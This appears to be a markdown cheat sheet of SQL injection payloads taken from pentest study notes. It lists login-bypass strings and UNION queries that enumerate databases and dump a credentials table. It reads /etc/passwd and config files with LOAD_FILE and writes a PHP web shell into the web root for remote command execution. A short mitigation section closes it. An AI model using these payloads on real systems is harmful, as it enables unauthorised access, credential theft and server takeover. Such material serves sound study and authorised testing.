# **Authentication Bypass**
```sql
admin' or '1'='1
```
###### **Using Comments**
```sql
admin'--
```

```SQL
admin')--
```
###### **LOGIN with ID**
```SQL
' OR id=5)-- -
```
# UNION
###### **ORDER BY**
```sql
' order by 1-- -
```

```sql
cn' UNION select 1,2,3-- -
```
###### **Location of Injection**
```sql
cn' UNION select 1,@@version,3,4-- -
```
# **Database Enumeration**
###### MySQL Fingerprinting

| Payload              | When to Use                      | Expected Output                                   | Wrong Output                                              |
| -------------------- | -------------------------------- | ------------------------------------------------- | --------------------------------------------------------- |
| **SELECT @@version** | When we have full query output   | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| **SELECT POW(1,1)**  | When we only have numeric output | 1                                                 | Error with other DBMS                                     |
| **SELECT SLEEP(5)**  | Blind/No Output                  | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS                   |
###### **SCHEMATA**
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
###### DATABASE
```sql
cn' UNION select 1,database(),2,3-- -
```
###### TABLES
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
###### COLUMNS
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
###### Data
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
# Reading Files
###### DB User
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
###### User Privileges
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
###### LOAD_FILE
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
###### SEARCH.PHP
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
###### CONFIG.PHP
```SQL
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```
# Writing Files
###### secure_file_priv
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
###### SELECT INTO OUTFILE
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
###### Writing a Web Shell
**shell.php**
```php
<?php system($_REQUEST[0]); ?>
```
**Remote Code Execution**
```sql
cn' union select "",'<?php echo "Shell";system($_GET['cmd']); ?>', "", "" into outfile '/var/www/html/web_shell.php'-- -
```
# Mitigating SQL Injection
###### Input Sanitization
**MySQL**
[mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)
**PostgreSQL**
[pg_escape_string()](https://www.php.net/manual/en/function.pg-escape-string.php)
###### Input Validation
[preg_match()](https://www.php.net/manual/en/function.preg-match.php)
###### User Privileges
```MariaDB
CREATE USER 'reader'@'localhost';
```

```MariaDB
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```

https://book.hacktricks.xyz/pentesting-web/sql-injection